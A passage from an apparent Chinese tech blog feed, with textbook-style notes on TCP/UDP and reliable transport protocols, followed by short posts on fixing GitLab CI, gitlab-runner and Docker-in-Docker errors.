还是选择 TCP.</p><p>IP 协议并不做任何确保，被称为不靠谱服务 (unreliable service).</p><p>将主机交付扩展到进程间交付被称为 <mark>运输层的多路复用 (transport-layer multiplexing)</mark> 与 <mark>多路分解 (demultiplexing)</mark> .</p><p>TCP 拥塞控制放置任何一条 TCP 连接用过多流量来淹没通信主机之间的链路和交换设备.</p><p>UDP 流量是不可调节的.</p><h2 id="3-2-多路复用和多路分解"><a href="#3-2-多路复用和多路分解" class="headerlink" title="3.2 多路复用和多路分解"></a>3.2 多路复用和多路分解</h2><p>一个进程，有一个或多个套接字 (socket), 它相当于从网络向进程传递数据和从进程向网络传递数据的门户.</p><p>套接字的标识符取决于它是 UDP 还是 TCP 套接字.</p><p>在源主机从不同套接字中收集数据块，并为每个数据块封装上首部信息从而生成报文段，然后将报文段传递到网络层，所有这些工作称为 <mark>多路复用 (multiplexing)</mark>. (多路应该是只来源为多个套接字) 相当于收集信件.</p><p>将运输层报文段中的数据交付到正确的套接字的工作称为 <mark>多路分解 (demultiplexing)</mark>, 相当于分发信件.</p><p>端口号是一个 16 比特的数，其大小在 0<del>65535 之间，0</del>1023 范围的端口号称为 <mark>周知端口号</mark>, 其保留给周知应用层协议使用.</p><p>当开发一个新的应用程序时，必须为其分配一个端口号.</p><p>在主机上的每个套接字能够分配一个端口号，当报文段到达主机时，运输层检查报文段中的目的端口号，并将其定向到相应的套接字，然后报文段中的数据通过套接字进入其所连接的进程.</p><h3 id="1-无连接的多路复用和多路分解"><a href="#1-无连接的多路复用和多路分解" class="headerlink" title="1. 无连接的多路复用和多路分解"></a>1. 无连接的多路复用和多路分解</h3><p>通常应用程序的客户端让运输层自动地分配端口号，而服务器端则分配一个特定的端口号.</p><p>UDP 套接字是由一个二元组全面标识的，该二元组包含</p><ul><li>一个目的 IP 地址</li><li>一个目的端口号.</li></ul><h3 id="2-面向连接的多路复用与多路分解"><a href="#2-面向连接的多路复用与多路分解" class="headerlink" title="2. 面向连接的多路复用与多路分解"></a>2. 面向连接的多路复用与多路分解</h3><p>TCP 套接字是由一个四元组:</p><ul><li>源 IP 地址</li><li>源端口号</li><li>目的 IP 地址</li><li>目的端口号</li></ul><p>主机使用全部 4 个值来将报文段定向到相应的套接字.</p><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p>如果我们确定一台主机上打开了一个端口，也许就能够将该端口映射到在该主机运行的一个特定的应用程序.</p><p>攻击者可以通过端口寻找具有已知安全缺陷的应用程序.</p><p>使用 <code>nmap</code> 这一程序来扫描端口.</p><p>nmap 返回打开的，关闭的或不可达的端口列表.</p><p>运行 nmap 的主机能够尝试扫描因特网中任何地方的目的主机.</p><h3 id="3-Web-服务器与-TCP"><a href="#3-Web-服务器与-TCP" class="headerlink" title="3. Web 服务器与 TCP"></a>3. Web 服务器与 TCP</h3><h2 id="3-3-无连接运输-UDP"><a href="#3-3-无连接运输-UDP" class="headerlink" title="3.3 无连接运输: UDP"></a>3.3 无连接运输: UDP</h2><p>UDP 只是做了运输协议能够做的最少工作.</p><p>使用 UDP 时, 在发送报文段之前, 发送方和接受方的运输层实体之间没有握手. (因此被称为无连接)</p><p>UDP 从应用程序得到数据, 附加上用于多路复用&#x2F;分解服务的源和目的的端口号字段, 以及其他两个小字段, 然后将形成的报文段交给网络层.</p><p>DNS 是一个通常使用 UDP 的应用层协议的例子.</p><p>在有些情况下使用 UDP 而不是 TCP 的原因:</p><ul><li>容忍一些数据丢失</li><li>无须建立连接, 减少时延</li><li>无连接状态, 不用维持一些状态信息</li><li>首部开销小</li></ul><p><img src="/../img/protocol_applications.png"></p><p>UDP 中缺乏拥塞控制会导致 UDP 发送方和接收方之间的高丢包率, 并挤跨 TCP 会话.</p><h3 id="3-3-1-UDP-报文段结构"><a href="#3-3-1-UDP-报文段结构" class="headerlink" title="3.3.1 UDP 报文段结构"></a>3.3.1 UDP 报文段结构</h3><p><img src="/../img/structure_of_UDP_rep.png"></p><p>UDP 的首部只有 4 个字段，每个字段由两个字节组成.</p><h3 id="3-3-2-UDP-检验和"><a href="#3-3-2-UDP-检验和" class="headerlink" title="3.3.2 UDP 检验和"></a>3.3.2 UDP 检验和</h3><p>UDP 检验和提供了差错检测功能. 即用于确定当 UDP 报文段从源到达目的地移动时，其中的比特是否发生了改变。</p><p>示例:</p><p><img src="/../img/check_add.png"></p><p>从这里看出为什么叫 “校验和”, “校验” 表示的是功能，”和” 是将四个字段的比特相加.</p><p>加法溢出后会有回卷，意思为往回加到第一位上.</p><p><img src="/../img/back_roll.png"></p><p>再将和取反码.</p><p>若 4 个比特的和加上校验和，结果为 1111111111111111, 则没有差错，反之.</p><p>虽然 UDP 提供差错检测，但它对差错恢复无能为力. UDP 的某种实现只是丢弃受损的报文段，其他实现是将受损的报文段交给应用程序并给出警告.</p><h2 id="3-4-可靠传输原理"><a href="#3-4-可靠传输原理" class="headerlink" title="3.4 可靠传输原理"></a>3.4 可靠传输原理</h2><ul><li>不损坏, 丢失</li><li>正确顺序</li></ul><h3 id="3-4-1-构造可靠数据传输协议"><a href="#3-4-1-构造可靠数据传输协议" class="headerlink" title="3.4.1 构造可靠数据传输协议"></a>3.4.1 构造可靠数据传输协议</h3><h4 id="1-经完全可靠信道的可靠数据传输-rdt1-0"><a href="#1-经完全可靠信道的可靠数据传输-rdt1-0" class="headerlink" title="1. 经完全可靠信道的可靠数据传输: rdt1.0"></a>1. 经完全可靠信道的可靠数据传输: rdt1.0</h4><h4 id="2-经具有比特差错信道的可靠数据传输-rdt2-0"><a href="#2-经具有比特差错信道的可靠数据传输-rdt2-0" class="headerlink" title="2. 经具有比特差错信道的可靠数据传输: rdt2.0"></a>2. 经具有比特差错信道的可靠数据传输: rdt2.0</h4><p><mark>自动重传请求 (Automatic Repeat reQuest, ARQ)</mark>  协议，使用 <mark>肯定确认 （positive acknowledgment (“OK”) ACK </mark> 与 <mark>否定确认 (negative acknowledgment) (“请再重复一边”) NAK</mark> , ARQ 协议中还需要另外三种协议功能来处理存在比特差错的情况:</p><ul><li>差错检测</li><li>接收方反馈</li><li>重传</li></ul><p>在分组中添加序号 (sequence number) 可以让接收方知道这是新的分组还是一次重传.</p><h4 id="3-经具有比特差错的丢包信道的可靠数据传输-rdt3-0"><a href="#3-经具有比特差错的丢包信道的可靠数据传输-rdt3-0" class="headerlink" title="3. 经具有比特差错的丢包信道的可靠数据传输: rdt3.0"></a>3. 经具有比特差错的丢包信道的可靠数据传输: rdt3.0</h4><p>理想的协议应尽可能快地从丢包中恢复过来，等待一个最坏情况的时延可能意味着要等待一段较长的时间, 直到启动差错恢复为止.</p><p>可以通过设置一个时间值来判断是否丢包, 如果在这个时间内没有受到 ACK, 则重传该分组.</p><p>分组序号在 0 和 1 之间交替，因此 rdt3.0 有时被称为 <mark>比特交换协议 (alternating-bit protocal)</mark> </p><p><img src="/../img/rdt3.0_ack_bit.png"></p><p>可靠传输协议的一些要点:</p><ul><li>校验和</li><li>序号</li><li>定时器</li><li>肯定确认</li><li>否定确认</li></ul><h3 id="3-4-2-流水线可靠数据传输协议"><a href="#3-4-2-流水线可靠数据传输协议" class="headerlink" title="3.4.2 流水线可靠数据传输协议"></a>3.4.2 流水线可靠数据传输协议</h3><p>停等协议，就是在发送第二个分组之前需要受到第一个分组的确认. 这种效率较低.</p><p>以不停等的方式运行，允许发送方发送多个分组而无须等待确认.</p><p><img src="/../img/pipline_tech_trans.png"></p><ul><li>增加序号范围, 每个分组有唯一序号</li><li>两端缓存分组，发送端缓存已发送但未确认的分组 (毕竟可能需要重发), 接收方缓存已经正确接收的分组 (收齐后好排正确的顺序)</li></ul><p>解决流水线的差错恢复的两种基本方法:</p><ul><li>回退 N 步 </li><li>选择重传</li></ul><h3 id="3-4-3-回退-N-步"><a href="#3-4-3-回退-N-步" class="headerlink" title="3.4.3 回退 N 步"></a>3.4.3 回退 N 步</h3><p>回退 N 步协议 (Go Back N protocol) 允许发送方发送多个分组而不需等待确认.</p><p>受限于未确认的分组数不能超过某个最大允许数 N.</p><p>那些已被发送但还未被确认的分组的许可序号范围可以被看成是一个在序号范围内长度为 N 的窗口.</p><p>N 常被称为 <mark>窗口长度 (window size)</mark>, GBN 协议常被称为 <mark>滑动窗口协议 (sliding-window protocal)</mark>.</p><p><img src="/../img/sliding_window_protocol.png"></p><p>流量控制是对发送方施加限制的原因之一.</p><p>一个分组的序号承载在分组首部的一个固定长度的字段中.</p><p>如果分组序号字段的比特数是 k, 则该序号范围是 $[0, 2^k - 1]$.</p><p>按序传输.</p><h3 id="3-4-4-选择重传"><a href="#3-4-4-选择重传" class="headerlink" title="3.4.4 选择重传"></a>3.4.4 选择重传</h3><p>选择重传，Selective Repeat protocol. 让发送方仅重传那些他怀疑在接收方出错的分组，而避免了不必要的重传.</p><p>SR 接收方将确认一个正确接收的分组而不管其是否按序。失序的分组将被缓存直到所有丢失分组皆被收到为止，这时才可以将一批分组按序交付给上层.</p><p>发送方和接收方的窗口间缺乏同步会产生严重的后果.</p><h2 id="3-5-面向连接的运输-TCP-Transmission-Control-Protocol"><a href="#3-5-面向连接的运输-TCP-Transmission-Control-Protocol" class="headerlink" title="3.5 面向连接的运输: TCP (Transmission Control Protocol)"></a>3.5 面向连接的运输: TCP (Transmission Control Protocol)</h2><h3 id="3-5-1-TCP-连接"><a href="#3-5-1-TCP-连接" class="headerlink" title="3.5.1 TCP 连接"></a>3.5.1 TCP 连接</h3><p>在一个应用进程可以开始向另一个应用进程发送数据之前, 这两个进程必须先相互 “握手”.</p><p>TCP 协议只在端系统中运行, 而不在中间的网络元素 (路由器和链路层交换机) 中运行.</p><p>中间路由器对 TCP 连接完全视而不见, 它们看到的是数据报, 而不是连接.</p><p>TCP 连接也总是点对点 (point-to-point) 的, 即在单个发送方与单个接受方之间的连接.</p><p>第三次握手时发送了有效载荷, 即应用层报文.</p><p>TCP 会先将从应用层来的数据放入 <mark>发送缓存 (send buffer)</mark> 里.</p><p>从缓存中取出并放入报文段中的数据数量受限于最大报文段长度 (Maximum Segment Size, MSS).</p><p>MSS 通常根据最大传输单元 (Maximum Transmission Unit, MTU) 来设置.</p><p>当 TCP 在另一端接收到一个报文段后。该报文段的数据就被放入该 TCP 连接的接收缓存中. 应用程序从此缓存中读取数据流.</p><p>TCP 连接的组成包括: 一台主机上的缓存，变量和与进程连接的套接字, 以及另一台主机上的另一组缓存，变量和与进程连接的套接字.</p><h3 id="3-5-2-TCP-报文结构"><a href="#3-5-2-TCP-报文结构" class="headerlink" title="3.5.2 TCP 报文结构"></a>3.5.2 TCP 报文结构</h3><p><img src="/../img/TCP_segment_structure.png"></p><p>同样由首部字段和一个数据字段组成.</p><p>首部包括源端口号和目的端口号. 也包括检验和字段 (checksum field).</p><h4 id="1-序号和确认号"><a href="#1-序号和确认号" class="headerlink" title="1. 序号和确认号"></a>1. 序号和确认号</h4><p>主机 A 发送一个报文段时, 一个报文段的序号是该报文段首字节的字节流编号.</p><p>主机 A 填充进报文段的确认号是主机 A 期望从主机 B 收到的下一字节的序号.</p><p>在一条 TCP 连接中收到失序报文段时，接收方保留失序的字节，并等待缺少的字节以填补该间隙.</p><h4 id="2-Telnel-序号和确认号的一个学习案例"><a href="#2-Telnel-序号和确认号的一个学习案例" class="headerlink" title="2. Telnel: 序号和确认号的一个学习案例"></a>2. Telnel: 序号和确认号的一个学习案例</h4><p>Telnel 运行在 TCP 上，被设计成可在任意一对主机之间工作.</p><p>发起会话的一般是客户端.</p><h3 id="3-5-3-往返时间的估计与超时"><a href="#3-5-3-往返时间的估计与超时" class="headerlink" title="3.5.3 往返时间的估计与超时"></a>3.5.3 往返时间的估计与超时</h3><p>超时时间间隔长度的设置，必须大于该连接的往返时间。</p><h4 id="1-估计往返时间"><a href="#1-估计往返时间" class="headerlink" title="1. 估计往返时间"></a>1. 估计往返时间</h4><p>TCP 不是为每一个报文段都会估计 RTT(Round Trip Time).</p><p>在任意时刻，TCP 仅为一个已发送的但目前尚未被确认的报文段估计 SampleRTT, 从而产生一个接近每个 RTT 的新 SampleRTT 值.</p><p>TCP 决不为已被重传的报文段计算 SampleRTT, 它仅为传输一次的报文段测量 SampleRTT.</p><p>计算公式见书.</p><h4 id="2-设置和管理重传超时间隔"><a href="#2-设置和管理重传超时间隔" class="headerlink" title="2. 设置和管理重传超时间隔"></a>2. 设置和管理重传超时间隔</h4><h3 id="3-5-4-可靠数据传输"><a href="#3-5-4-可靠数据传输" class="headerlink" title="3.5.4 可靠数据传输"></a>3.5.4 可靠数据传输</h3><p>TCP 的可靠数据传输服务确保一个进程从其接收缓存中读出的数据流是无损坏，无间隙，非冗余和按序的数据流.</p><p>在 TCP 发送方有 3 个与发送和重传有关的主要事件:</p><ul><li>TCP 从应用程序接收数据</li><li>定时器超时</li><li>收到 ACK</li></ul><h3 id="3-5-5-流量控制"><a href="#3-5-5-流量控制" class="headerlink" title="3.5.5 流量控制"></a>3.5.5 流量控制</h3><p>TCP 为它的应用程序提供了流量控制服务 (flow-control service) 以消除发送方使接收方缓存溢出的可能性.</p><p>TCP 通过让发送方维护一个称为 <mark>接收窗口 (receive window)</mark>  的变量来提供流量控制.</p><p>接收窗口用于告诉发送方 – 该接收方还有多少可用的缓存空间.</p><h3 id="3-5-6-TCP-连接管理"><a href="#3-5-6-TCP-连接管理" class="headerlink" title="3.5.6 TCP 连接管理"></a>3.5.6 TCP 连接管理</h3><p>TCP 连接的建立会显著地增加人们感受到的时延.</p><h1 id="第4章-网络层：数据平面"><a href="#第4章-网络层：数据平面" class="headerlink" title="第4章 网络层：数据平面"></a>第4章 网络层：数据平面</h1><p>在网络中的每一台主机和路由器都有一个网络层部分.</p><p>网络层能够被分解为两个相互作用的部分:</p><ul><li>数据平面, 网络层中每台路由器的功能, 到达路由器输入链路之一的数据报如何转发到该路由器的输出链路</li><li>控制平面, 路由器之间的路由方式</li></ul><h2 id="4-1-网络层概述"><a href="#4-1-网络层概述" class="headerlink" title="4.1 网络层概述"></a>4.1 网络层概述</h2><p>每台路由器的数据平面的主要作用是从其输入链路向其输出链路转发数据报, 控制平面的主要作用是协调这些本地的每路由器转发动作, 使得数据包沿着源和目的地主机之间的路由器路径最终进行端到端传送.</p><h3 id="4-1-1"><a href="#4-1-1" class="headerlink" title="4.1.1"></a>4.1.1</h3>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于-gitlab-ci-使用-ssh-时-invalid-format-报错</title>
    <link href="/2022/11/06/%E5%85%B3%E4%BA%8E-gitlab-ci-%E4%BD%BF%E7%94%A8-ssh-%E6%97%B6-invalid-format-%E6%8A%A5%E9%94%99/"/>
    <url>/2022/11/06/%E5%85%B3%E4%BA%8E-gitlab-ci-%E4%BD%BF%E7%94%A8-ssh-%E6%97%B6-invalid-format-%E6%8A%A5%E9%94%99/</url>
    
    <content type="html"><![CDATA[<p>报错如下:<br><img src="/../img/ssh_invalid_format.png"></p><h1 id="解决"><a href="#解决" class="headerlink" title="解决"></a><a href="https://stackoverflow.com/questions/52109775/gitlab-ci-ssh-key-invalid-format">解决</a></h1><p>取消 <code>protected</code> 的设置.</p>]]></content>
    
    
    <categories>
      
      <category>Git</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于-Arch-更新后-docker-compose-报错</title>
    <link href="/2022/11/06/%E5%85%B3%E4%BA%8E-Arch-%E6%9B%B4%E6%96%B0%E5%90%8E-docker-compose-%E6%8A%A5%E9%94%99/"/>
    <url>/2022/11/06/%E5%85%B3%E4%BA%8E-Arch-%E6%9B%B4%E6%96%B0%E5%90%8E-docker-compose-%E6%8A%A5%E9%94%99/</url>
    
    <content type="html"><![CDATA[<p><a href="https://serverfault.com/questions/738773/docker-failed-to-add-the-pair-interfaces-operation-not-supported">参考</a></p><p>类似于这样的报错，忘记截屏了:</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs subunit"><span class="hljs-keyword">Error </span>response from daemon: Cannot start container 4145d0fccd96b904e4ab4413735f1129b8765429bad5be71dc8d5f4c0760666d:<br>failed to create endpoint high_saha on network bridge:<br>failed to add the host (veth7f6f907) &lt;=&gt; sandbox (veth788d9dc) pair interfaces: operation not supported<br></code></pre></td></tr></table></figure><p>重启即可.</p><p>原因为，在内核更新后，所有的在  <code>/usr/lib/modules/&#123;KERNEL_VERSION&#125;</code> 下的 <code>.ko</code> 模块文件会被删掉，而 docker 需要一些模块来创建接口，重启可以重新加载这些模块.</p>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>gitlab-搭建好后服务器卡顿以及502报错</title>
    <link href="/2022/11/06/gitlab-%E6%90%AD%E5%BB%BA%E5%A5%BD%E5%90%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8D%A1%E9%A1%BF%E4%BB%A5%E5%8F%8A502%E6%8A%A5%E9%94%99/"/>
    <url>/2022/11/06/gitlab-%E6%90%AD%E5%BB%BA%E5%A5%BD%E5%90%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8D%A1%E9%A1%BF%E4%BB%A5%E5%8F%8A502%E6%8A%A5%E9%94%99/</url>
    
    <content type="html"><![CDATA[<p>原因是 gitlab 会占用大量的内存.</p><p><a href="https://cloud.tencent.com/developer/article/1710156">参考2</a></p>]]></content>
    
    
    <categories>
      
      <category>Git</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>使用-gitlab-ci-时报错-unable-to-access</title>
    <link href="/2022/11/06/%E4%BD%BF%E7%94%A8-gitlab-ci-%E6%97%B6%E6%8A%A5%E9%94%99-unable-to-access/"/>
    <url>/2022/11/06/%E4%BD%BF%E7%94%A8-gitlab-ci-%E6%97%B6%E6%8A%A5%E9%94%99-unable-to-access/</url>
    
    <content type="html"><![CDATA[<p>报错如下:</p><p><img src="/../img/gitlab-ci-unable-to-access.png"></p><h1 id="参考1"><a href="#参考1" class="headerlink" title="参考1"></a><a href="https://forum.gitlab.com/t/gitlab-runner-connection-refused/33589">参考1</a></h1><p>这篇文章中确定了问题所在，在 docker 运行环境下，它找不到 <code>127.0.0.1</code>.</p><h1 id="solution"><a href="#solution" class="headerlink" title="solution"></a><a href="https://docs.gitlab.com/runner/configuration/advanced-configuration.html#how-clone_url-works">solution</a></h1><p>添加 <code>clone_url</code> 解决.</p><p><img src="/../img/clone_url_solution.png"></p>]]></content>
    
    
    <categories>
      
      <category>Git</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于-docker-推送到-dockerhub-上时报错</title>
    <link href="/2022/11/05/%E5%85%B3%E4%BA%8E-docker-%E6%8E%A8%E9%80%81%E5%88%B0-dockerhub-%E4%B8%8A%E6%97%B6%E6%8A%A5%E9%94%99/"/>
    <url>/2022/11/05/%E5%85%B3%E4%BA%8E-docker-%E6%8E%A8%E9%80%81%E5%88%B0-dockerhub-%E4%B8%8A%E6%97%B6%E6%8A%A5%E9%94%99/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.biostars.org/p/9531985/">参考</a></p><p>推送之前不用先在 dockerhub 上创建仓库.</p><p>重新打一下标签，格式为:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ docker login -u <span class="hljs-string">&quot;<span class="hljs-variable">$USERNAME</span>&quot;</span> -p <span class="hljs-string">&quot;<span class="hljs-variable">$PASSWD</span>&quot;</span><br>$ docker tag image_name YOUR_DOCKERHUB_NAME/image_name<br>$ docker push YOUR_DOCKERHUB_NAME/image_name<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于-gitlab-runner-注册时报错</title>
    <link href="/2022/11/05/%E5%85%B3%E4%BA%8E-gitlab-runner-%E6%B3%A8%E5%86%8C%E6%97%B6%E6%8A%A5%E9%94%99/"/>
    <url>/2022/11/05/%E5%85%B3%E4%BA%8E-gitlab-runner-%E6%B3%A8%E5%86%8C%E6%97%B6%E6%8A%A5%E9%94%99/</url>
    
    <content type="html"><![CDATA[<p>报错如下:<br><img src="/../img/gitlab_runner_error.png"></p><p>可能是代理原因，但是移出 <code>http_proxy</code> 和 <code>https_proxy</code> 两个环境变量仍然报错，但是在另一台机器上执行即成功注册.</p><h1 id="另一个错误"><a href="#另一个错误" class="headerlink" title="另一个错误"></a>另一个错误</h1><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">PANIC: Near <span class="hljs-built_in">line</span> <span class="hljs-number">51</span> (<span class="hljs-keyword">last</span> key parsed <span class="hljs-string">&#x27;runners.docker.volumes&#x27;</span>): Key <span class="hljs-string">&#x27;runners.docker.volumes&#x27;</span> <span class="hljs-built_in">has</span> already been defined.<br></code></pre></td></tr></table></figure><p>其原因是一个 runner 上注册太多了，清理一下配置文件 <code>/srv/gitlab-runner/config/config.toml</code> 即可。</p>]]></content>
    
    
    <categories>
      
      <category>Git</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于在-dind-容器中使用-docker-命令后报错</title>
    <link href="/2022/11/05/%E5%85%B3%E4%BA%8E%E5%9C%A8-dind-%E5%AE%B9%E5%99%A8%E4%B8%AD%E4%BD%BF%E7%94%A8-docker-%E5%91%BD%E4%BB%A4%E5%90%8E%E6%8A%A5%E9%94%99/"/>
    <url>/2022/11/05/%E5%85%B3%E4%BA%8E%E5%9C%A8-dind-%E5%AE%B9%E5%99%A8%E4%B8%AD%E4%BD%BF%E7%94%A8-docker-%E5%91%BD%E4%BB%A4%E5%90%8E%E6%8A%A5%E9%94%99/</url>
    
    <content type="html"><![CDATA[<p>报错内容如下:</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs subunit"><span class="hljs-keyword">error </span>during connect: Get &quot;http://docker:2375/v1.24/images/json&quot;: dial tcp: lookup docker on 114.114.114.114:53: no such host<br></code></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a><a href="https://www.bilibili.com/video/BV1sK4y1d7ej/?spm_id_from=pageDriver&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">参考</a></h1><p>通过修改 runner 的配置文件解决.</p><p>如，在 <code>/srv/gitlab-runner/config/config.toml</code>添加两个 volume.</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-attr">[<span class="hljs-string">&quot;/usr/bin/docker:/usr/bin/docker&quot;</span>, <span class="hljs-string">&quot;/var/run/docker.sock:/var/run/docker.sock&quot;</span>]</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>什么是-Jenkins</title>
    <link href="/2022/11/05/%E4%BB%80%E4%B9%88%E6%98%AF-Jenkins/"/>
    <url>/2022/11/05/%E4%BB%80%E4%B9%88%E6%98%AF-Jenkins/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.bilibili.com/video/BV15y4y1r7Da/?spm_id_from=333.337.search-card.all.click&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">参考1</a></p><p>总的来说，是一个工具，其将传统的 生产 -&gt; 集成 -&gt; 测试 -&gt; 部署 的步骤进行统一的管理.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于-docker.sock</title>
    <link href="/2022/11/05/%E5%85%B3%E4%BA%8E-docker.sock/"/>
    <url>/2022/11/05/%E5%85%B3%E4%BA%8E-docker.sock/</url>
    
    <content type="html"><![CDATA[<h1 id="参考1"><a href="#参考1" class="headerlink" title="参考1"></a><a href="https://blog.csdn.net/qq_42997214/article/details/122990008">参考1</a></h1><p>docker 是 client-server 架构.</p><p><code>/var/run/docker.sock</code> 是 docker daemon 监听的套接字，容器中的进程可以通过它与 docker daemon 通信.</p><p>将 <code>/var/run/docker.sock</code> 挂载到容器中. 容器就可以通过向 <code>/var/run/docker.sock</code> 发送 http 请求来和 docker daemon 通信.</p><p>也就是是说 <code>docker run</code> 之类的命令实际上是转换为向这个套接字发出的请求. </p><p>因此，若容器中有 docker 的命令行工具和宿主机上的 <code>/var/run/docker.sock</code> 文件，就可以在 dockr 之内运行 docker 命令.</p><h1 id="参考2"><a href="#参考2" class="headerlink" title="参考2"></a><a href="https://blog.51cto.com/topic/docker.sockwenjian.html">参考2</a></h1><p>可以用 <code>curl</code> 命令向 <code>/var/run/docker.sock</code> 套接字发送 http 请求，如:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ curl -XPOST --unix-socket /var/run/docker.sock -d ‘&#123;“Image”:”nginx”&#125;’ -H ‘Content-Type: application/json’ http://localhost/containers/create<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>关于-docker-dind</title>
    <link href="/2022/11/05/%E5%85%B3%E4%BA%8E-docker-dind/"/>
    <url>/2022/11/05/%E5%85%B3%E4%BA%8E-docker-dind/</url>
    
    <content type="html"><![CDATA[<h1 id="参考1"><a href="#参考1" class="headerlink" title="参考1"></a><a href="https://blog.csdn.net/u010533742/article/details/116801020">参考1</a></h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>dind 是 docker in docker 的意思.</p><p>其原理是在 docker 容器内包含 docker 命令行工具，其实际的执行交还给宿主机的 docker-engine 执行.</p><h2 id="为什么使用-Docker-in-Docker"><a href="#为什么使用-Docker-in-Docker" class="headerlink" title="为什么使用 Docker-in-Docker"></a>为什么使用 Docker-in-Docker</h2><p>在 pipline 中运行的环境为 docker, 若还要使用 docker 命令，则形成了 Docker-in-Docker.</p><h1 id="参考2"><a href="#参考2" class="headerlink" title="参考2"></a><a href="https://blog.nestybox.com/2019/09/14/dind.html">参考2</a></h1><p>两种实现 Docker-in-Docker 的方式:</p><ul><li>DinD, Docker-in-Docker 在一个容器内运行 Docker daemon</li><li>DooD, Docker-out-of-Docker, 只在容器内运行 Docker CLI, 和宿主机的 Docker daemon 连接.</li></ul><h2 id="DinD"><a href="#DinD" class="headerlink" title="DinD"></a>DinD</h2><p>利用 dind 这个镜像.</p><p>原理图:<br><img src="/../img/Docker_DinD.png"></p><h2 id="DooD"><a href="#DooD" class="headerlink" title="DooD"></a>DooD</h2><p>将宿主机的 <code>docker.sock</code> 文件挂载到容器中.</p><p>如:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ docker run -it -v /var/run/docker.sock:/var/run/docker.sock docker<br></code></pre></td></tr></table></figure><p>原理图如下:<br><img src="/../img/Docker_DooD.png"></p><p>好处:</p><ul><li>减少复杂性</li><li>防止使用不安全的 privileged container</li></ul><p>缺点:</p><ul><li>名称冲突, 和宿主机的容器名称不能相同</li><li>挂在路径, 在容器内用 Docker CLI 挂载目录时是相对于宿主机</li><li>端口映射，同样是和宿主机.</li></ul><h2 id="使用-Nestrbox"><a href="#使用-Nestrbox" class="headerlink" title="使用 Nestrbox"></a>使用 Nestrbox</h2>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于-gitlab-的使用和理解</title>
    <link href="/2022/11/05/%E5%85%B3%E4%BA%8E-gitlab-%E7%9A%84%E4%BD%BF%E7%94%A8%E5%92%8C%E7%90%86%E8%A7%A3/"/>
    <url>/2022/11/05/%E5%85%B3%E4%BA%8E-gitlab-%E7%9A%84%E4%BD%BF%E7%94%A8%E5%92%8C%E7%90%86%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<p>首先，gitlab 是一个平台，不管使用 docker 来搭建 gitlab 还是直接的镜像，都只是搭建这个平台用. 可以在 Web 上访问.</p><p>gitlab-runner 是另一个平台，其用来运行 gitlab CI&#x2F;CD。</p><p>因此使用 gitlab CI&#x2F;CD 之前，需要先搭建好 gitlab-runner, 然后在 gitlab 的 project 上注册这个 runner (才找得到 runner 在哪里以及哪一个) 之后才能使用.</p><h2 id="利用-docker-搭建-gitlab"><a href="#利用-docker-搭建-gitlab" class="headerlink" title="利用 docker 搭建 gitlab"></a>利用 docker 搭建 gitlab</h2><p><a href="https://www.bilibili.com/read/mobile?id=14636241&share_medium=android&share_plat=android&share_session_id=9f648ec4-b6af-4a38-aa41-0d689585fc0b&share_source=COPY&share_tag=s_i&timestamp=1640852403&unique_k=qmhoF8p">参考</a></p><p>如下:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">export</span> GITLAB_HOME=/srv/gitlab<br>$ <span class="hljs-built_in">mkdir</span> -p /opt/docker-compose/gitlab<br>$ vim /opt/docker-compose/gitlab/docker-compose.yml<br></code></pre></td></tr></table></figure><p>在 docker-compose.yml 中添加:</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 